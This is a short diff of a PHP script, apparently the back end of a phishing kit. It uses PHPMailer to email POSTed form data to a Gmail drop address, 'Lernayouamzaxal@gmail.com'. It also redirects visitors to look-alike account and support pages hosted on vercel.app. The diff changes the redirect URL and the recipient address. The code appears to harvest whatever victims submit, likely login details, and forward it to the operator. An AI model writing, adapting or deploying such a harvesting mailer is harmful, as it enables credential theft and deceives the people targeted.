@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://case-accczqz4cd1pfr4005-support.vercel.app/");
+header("Location: https://account-page-apply.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -35,7 +35,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'abd');
-        $mail->addAddress('brianna.mary.ad@gmail.com');
+        $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
 
 
